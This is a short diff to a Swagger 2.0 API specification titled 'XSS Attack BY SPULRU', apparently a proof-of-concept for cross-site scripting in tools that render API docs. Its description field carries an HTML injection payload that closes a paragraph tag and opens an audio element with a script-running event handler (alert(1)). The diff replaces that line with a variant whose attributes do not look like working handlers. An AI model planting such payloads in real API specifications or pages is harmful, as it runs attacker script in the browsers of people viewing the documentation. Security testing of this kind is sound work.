@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
-  description: </p><audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio><p>
+  description: </p><audio autoplay=alert() loadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio><p>
     
   version: production
 basePath: /JSSResource/
